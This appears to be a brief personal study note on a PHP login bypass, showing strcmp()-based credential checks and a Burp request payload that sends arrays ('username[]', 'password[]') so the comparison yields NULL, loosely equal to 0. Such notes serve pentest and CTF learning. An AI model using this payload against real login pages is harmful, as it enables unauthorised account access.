---
title: strcmp()
updated: 2023-11-01 12:44:42Z
created: 2023-11-01 12:41:58Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

```
if (strcmp($username, $_POST['username']) == 0) {
if (strcmp($password, $_POST['password']) == 0) {
```

Burp a payload with empty list `username[]=admin&password[]=password` causing NULL == 0